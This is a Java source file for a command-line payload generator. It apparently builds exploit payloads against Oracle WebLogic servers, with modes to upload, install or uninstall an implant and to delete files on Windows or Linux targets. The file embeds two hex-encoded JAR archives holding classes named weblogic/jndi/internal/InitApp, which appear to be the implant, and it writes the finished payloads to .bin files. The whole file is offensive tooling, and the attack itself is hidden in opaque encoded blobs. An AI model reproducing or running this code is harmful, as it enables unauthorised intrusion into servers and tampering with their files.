
import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.FileOutputStream;

import Utils.Utils;
import payload.GenInstallPayload;
import payload.GenPayload;

public class genPayload {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		if(args.length!=2){
			printUsage();
			return;
		}
		String OS=args[0];
		String Payload_Type=args[1];
		String fileName="";
		//
		if(OS.equals("win")) OS="Windows";
		else OS="Linux";
		if (Payload_Type.equals("inst"))Payload_Type="Install";
		else if(Payload_Type.equals("uninst")) Payload_Type="Uninstall";
		//
		byte[] payload=null;
		if(Payload_Type.equals("upload_inst")){
			fileName="./payload_"+OS+"_upload_inst.bin";				
			byte[] payload_initapp=genInitAppPayload("Install");
			payload=genWritePayload(OS,payload_initapp);
		}
		else if(Payload_Type.equals("upload_uninst")){
			fileName="./payload_"+OS+"_upload_uninst.bin";
			byte[] payload_initapp=genInitAppPayload("Uninstall");
			payload=genWritePayload(OS,payload_initapp);
		}
		else if(Payload_Type.equals("Install") ){
			fileName="./payload_"+OS+"_inst.bin";
			payload=genInstPayload(OS);
		}
		else if(Payload_Type.equals("Uninstall") ){
			fileName="./payload_"+OS+"_uninst.bin";
			payload=genInstPayload(OS);
		}
		else if(Payload_Type.equals("delete")){
			fileName="./payload_"+OS+"_delete.bin";
			payload=genDeleteFilePayload(OS);
		}
		else{
			System.out.println("\tPayload_Type:upload_inst|inst|upload_uninst|uninst|delete");
			return;
		}
		if(saveFile(fileName,payload)){
			System.out.println("save payload to file success!");
		}
		else{
			System.out.println("save payload fail!");
		}
	}
	private static void printUsage(){
		System.out.println("Usage:java genPayload [OS] [Payload_Type]");
		System.out.println("\tOS:win|linux");
		System.out.println("\tPayload_Type:upload_inst|inst|upload_uninst|uninst|delete");
	}
	private static byte[] genInitAppPayload(String Type){
		String Tro = "504b03041400080808001c0a8c47000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b0304140008080800f8838b47000000000000000000000000240000007765626c6f6769632f6a6e64692f696e7465726e616c2f496e69744170702e636c6173733bf56fd73e06060643065e7606264606b9f2d4a49cfcf4cc64fdacbc944cfdccbc92d4a2bcc41c7dcfbccc12c78202760616460681acc4b244fd9cc4bc747dffa4acd4e41276063646067eb068516ea67e506a6e7e492a23035b51699e736e0a23839a860f424b704951665ebab526a61023037b4169895b660e50af05162d441ac2159c5f5a949c0a318707ea703d9042a02b191998819815e86326a04fd8193818403ee264e0028a30327083c4197800504b0708cec235e9b100000014010000504b0304140008080800050a8c47000000000000000000000000280000007765626c6f6769632f6a6e64692f696e7465726e616c2f496e6974417070496d706c2e636c6173738d56fb731355183ddb26ddb0aca52dcf52858285be09c83bad155a5a2da60f0b2d84a275936ec3d66413371b283e01451151f10d8a828a83e38c2330638296d11f9df1bf50a9a333cef81fa8e76ed2366da33099ecbd7beff77df79cef75f7a7bfbffb1ec0067c2ea340c2ea237a30120b1b21efa8396c780dd3d62d538b783b4dc3de198f7746e311192e0925a3da61cd1bd1ccb0b72738aa876c19451256fcbfb60497a945750965fe69f53db66598e1260945cd06c55a242cae99bb5d3b2041691f0be971db88990919774958e6485951c3dba74763b63eb5cd73da62c3ba824294a8988752098535b503f32061a10a191e090bfc86a97727a341dddaab05230ea658488b0c689621deb38b2efb90919050e5bfbd5bc840a268919534dba2c312d6e663317749c1dd5821e31e09a5d37b7d49d336a2ba8a95a824efb06e67578473728d64971d2bab55dc8b2a62d6c7f49084eadb9cdf6bc5427a22d12463ad8425ceba11f3b6264746744b1feed3b561dd925123a17c72afd38c276d5ad2b568665b411d1a64d4cfc09eb5aba211eb2414137b8e9e84a593f8671a24836aac17c1dac0c0d6e415a91d50b0061b85d02646725a288386fb32b64c72c9a19de1a460334ac463bb0a1f44be69f1b86e32520d7714a98c95260fee67a01581e401153bb0538287e886453e4958549337c49bd1a66297236bc732ab0a3af0908c0749645a612a8355740a6911f92e3a530bd3766148a4952b4eff52294f242514042d7acf9f3f98623f119cda9f4b8dc6230e0b49e4993f0f2c8ac88c4787216a635b1eb7dd51cacbd83759bc04298cf524eda9302b184040c4983e1ec4a3320ecee836191b2a1ec310bd49ffb41eb575d69daba676b055e86a2a82a087dc472cc3264c77cd60abc89c01b09e46442f708722b1842ee39004351785823002e2f1848a0898ab45fa9891b0134ef7382023c6ec9deb3a23e254c2209e546181c2f2612d92d47b4666b5804c9bccdf024c043c382c61d5ad1ba76fddbcf4dba9b313a72ffe75f3f844fafa1f5f9ef9fdebe3135f9d9bb8f0c5afc74e08d93191c0472534de61de3a089d53da3c7886bd6fd62984dc166347336dbab157b3e9978211925deeffaf18895e477ec5330444fe443583dd7749cd60be0eeec14b3c7c68689f7f48f44d438bf88da0c2a61c90f18a840aa132e6e50d41716f56c20136662b388592f93883d765bcc6329b219a9551f106ce1243d010459daffde589062f85b7f08e8cb76726d9d184ad4755bc8bf7187cddb2a6ea815c7b696bd20f1e9ce351b328f92a35b3529fac99ca582894b458853e051fe0828c0f274b7ea62d151f4111f5259622e20ed3ac30d369611e5f12542c382a5a823d4677fbf3b98342ca9e58d20ae999722dc9b9abd60905aca2eb0bf977f35f20ae457e07b83867e9f17d7ef64d4531671d5c29e0a8d4a5b1a0aefe1b945de35b0116f1594c2bc0324a9753773916f36d49469ae352c0992da37da60d6596f3296cfec2938b38eebe818afa1456758d634d601cd58186146ad3f0a6715ff7383607d2d8ea735d4149b9abdc9dc2b6b2663ef635a6d012f0b97ffce7cf72570aad57bba8d47e95968136b6da8e2cb6b54404f66a0f6715bc62aa50cb671d36716c410325d7a11deb1dcc7d8e07764f61decd9fc0ec41331e869f162ba8d5856ef2ad42257ad04bced5b80b8f50c68d269e9599b5f3df873dd490b017fd59be3f53cfcdb17f1c03818634f6773792f681141e2799e17184c5a2e1730942a3e7b1741c66a0e106e269d865c9148ea4f0d4d5dcb5a7b36bdd8d0e75e1701f41751048b733e6ba600b9f5b518a6da4ba9ddf153e026fa6e40e4aee22910ec7052d4e40faa75cd08f671d1788d9739c15d04a079ec731525949b71dc709baa0374bb790bb2fe0c59ce4e970885fe68e48914de390026527d378d93f8e538cebe9ae86b293f5dfe2d5425ce1bd741d6f96bd9fc2798e744c3b67f53f5c734eafc08a597cf632a5fa51c6b65e81fddc0d10cf01721ae4a7ec416ce4fd20f8d41105cfc5c7b8e82461292e91193ff668e3137c4a8b2b69536017a9f99993d297ff05504b07081a09e4b5d4050000130b0000504b010214001400080808001c0a8c47b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800f8838b47cec235e9b1000000140100002400000000000000000000000000610000007765626c6f6769632f6a6e64692f696e7465726e616c2f496e69744170702e636c617373504b01021400140008080800050a8c471a09e4b5d4050000130b00002800000000000000000000000000640100007765626c6f6769632f6a6e64692f696e7465726e616c2f496e6974417070496d706c2e636c617373504b05060000000003000300ee0000008e0700000000";
	    if (Type.equals("Uninstall"))
	    {
	      System.out.println("Start to uninstall");
	      
	      Tro = "504b0304140008080800360a8c47000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b0304140008080800f8838b47000000000000000000000000240000007765626c6f6769632f6a6e64692f696e7465726e616c2f496e69744170702e636c6173733bf56fd73e06060643065e7606264606b9f2d4a49cfcf4cc64fdacbc944cfdccbc92d4a2bcc41c7dcfbccc12c78202760616460681acc4b244fd9cc4bc747dffa4acd4e41276063646067eb068516ea67e506a6e7e492a23035b51699e736e0a23839a860f424b704951665ebab526a61023037b4169895b660e50af05162d441ac2159c5f5a949c0a318707ea703d9042a02b191998819815e86326a04fd8193818403ee264e0028a30327083c4197800504b0708cec235e9b100000014010000504b0304140008080800270a8c47000000000000000000000000280000007765626c6f6769632f6a6e64692f696e7465726e616c2f496e6974417070496d706c2e636c6173738d56fb73135514feb64dbb212c50c2b3ad948285be09ef475b2bb4345a4c1f16da128ad64db20d5b934ddc6ca0f804144544c537280a8a3338ce380233266818fdd119ff0b953a3ae38cff81fadd4dfa8ec27472efdd7b1ef7fbce39f7dcfef4f777df03d884cf651448587b4c0b4462613de8193542ba47372ccd34d488a7d3d0ad3df17867341e91e1905032aa1e553d11d5087b7a02a35ad092512ca1e2ffad25380c35aa4970fba6ccf75ba66e849b2514b7e8546b95b0ac66aeb8764082ab632ca8c52d3d6624642c90b0d2d632a3baa74f8bc62c6d52cc73da6321cd854294289887c5120a6b6a07e641c21205329c1216f97443eb4e46039a79400d446c4cb1a01a19504d5d7ce7361dd6113d21a1ca77f7b0908144d5623369b4474312d6e7633177cb85fb5021639584c553b2bea461e9514dc16a54927758b3723b2238d39de4b66d2f6b15dc8f2a62d6c6b4a084eabb9cdf6bc6825a22d12c63bd84e5f6be1ef3b425474634530bf5696a483365d448289d90751af1a4454f9a1acd8a5da843838cfa19d8737e153462838485c43ecd4ec28a09fc331d924135368a646d62626bf2aad40eb8b00e5b84d25666724a298b867219db27b84ca39de5e4c236948861978226887a53e371cd60a61aee2953592fcd4e3cc044bb04920715ecc61e094ea20b897a92b0b4266f8ab7a15dc15e5bd78a65775df0e261190f91c894c164052be814da22f35d0ca61aa6efc2a0282b479cf1a5519e4c4a2808988c9e2f7f32853c119894cfa546e7119b8524eacc9707165564e6c3ab8bbbb1334fd8eea9e4650c4e5c5e8214ce7a92d6649a5d18805fe498311ec263320ecfe836591f0a1ec730a3c9f8b41db734de3b474ded509bb0551504c008151d33758b308b6a86da44e50c80f76944f482a2602496d0641c91a04c47e142187e313ca92002d66ab136a627ac84dd3d0ec988b17ae7864e8fd83761084f29304165f9a81a496a3d23b35a40b64de66f0106fc4e1c95b0e6ceadb3776e5ff9edccf9f1b397ffba7d723c7df38f2fcffdfef5c9f1af2e8c5ffae2d713a784ee9828e0e3121aefb16e6d84f629ed4e3ccbde37eb14426e8fb1a31916c3d8ab5a8c4bc108c996f9fe2b47a2d791dfc2190aa27ea2aaceeebbbc66285f0777e2651e3e3c3ce81b167d5357233e3de06253f6cb785542b93019f3f085a0ba27a761031bb35c388392f938873764bcce6b364335a7a3e04db898b4a411d08dd03cbc857764bc3db3788e272c2daae05dbcc7a46aa63959e7e4d04b9813fc9cf8801d7416d4a64ad5a8d426ee42652c184c9abc5d4d2e5cc447323e9cb8ca337d29b82460c971b115116f936a8659264bf2c488a062815171d5ad3186d1978f26955cfb634933a865af61c9b437688330c01a86b490bf22fe0ac473c7f7ddc135af14bfe7e7be142ce4cacb9d02ceaeba3416d5d57f03f70d7e156029c785f402aca476296dcbb08c5fcbb3da9c5700f66a25fdb31ca853c651f8fc85271773de770be5f529ace9ca609d3f836a7f430ab56978d2d8dc9dc1367f1a3b9a1cd75052ea282d4a61a7bb85c360630aadfea6a21ffff9b3d49142dbf52e1a755ca767a09d2dd49bc3b69e88c01eece4aa9c4f47156a39d6612be756345073033ab0d1c6dc674760df24e67dfc13989d68c123f0d16339adbad04dbe55a8440f7ac9b91a0bf028758ad0ccb3b2ab0efefab09f16120ea03fc7f767da1571eecf60c0df90c6c1ee46d23e94c2132413ca202c36f5268720347a112b3230fc0db7104fc37227533896c2d3d7a7ef3d93dbeb6eb4a98b803711949740baed797a08b673dc81c5d849aabbf8ff421381b750733735f79288d70e41ab9d90fec910f4e3393b0462f53c5705f4e2c50b38412aab19b69338c510f4e6e81652fa225e9a563c5e9bf8554a44896cc940f2bb4fa7f18a2f8333ccebd9ae06f7e96ff15a01aef1b9b989f3eef753b8c09971e9e0aafe871bf6e16558358bce0156543fdc18a4ec20a57e54e01065430475189bd9f6059d3a82e0b1f8189fd8355882cb24c6ffe148e50a3ea5c70afa14d045657e6657f4d57f01504b070839c7d9fecc050000ea0a0000504b01021400140008080800360a8c47b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800f8838b47cec235e9b1000000140100002400000000000000000000000000610000007765626c6f6769632f6a6e64692f696e7465726e616c2f496e69744170702e636c617373504b01021400140008080800270a8c4739c7d9fecc050000ea0a00002800000000000000000000000000640100007765626c6f6769632f6a6e64692f696e7465726e616c2f496e6974417070496d706c2e636c617373504b05060000000003000300ee000000860700000000";
	    }
	    byte[] ClassByte = Utils.hexStringToBytes(Tro);
	    return ClassByte;
	}	
	private static byte[] genInstPayload(String OS){
		GenInstallPayload p = new GenInstallPayload();
		try {
			byte[] payload=GenInstallPayload.Gen(OS);
			return payload;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static byte[] genWritePayload(String OS,byte[] context){
		GenPayload p = new GenPayload();
		try {
			byte[] payload=GenPayload.Gen(OS,context);
			return payload;
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static byte[] genDeleteFilePayload(String OS){
		GenPayload p = new GenPayload();
		try {
			byte[] payload=GenPayload.DeleteFile(OS);
			return payload;
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static boolean saveFile(String fileName,byte[] context){
	        try     
	        {      
	            DataOutputStream out=new DataOutputStream(      
	                                 new BufferedOutputStream(      
	                                 new FileOutputStream(fileName)));    
	            out.write(context);
	            out.close();      
	            
	            return true;
	        } catch (Exception e)      
	        {      
	            e.printStackTrace();
	            return false;
	        }      
	}

}
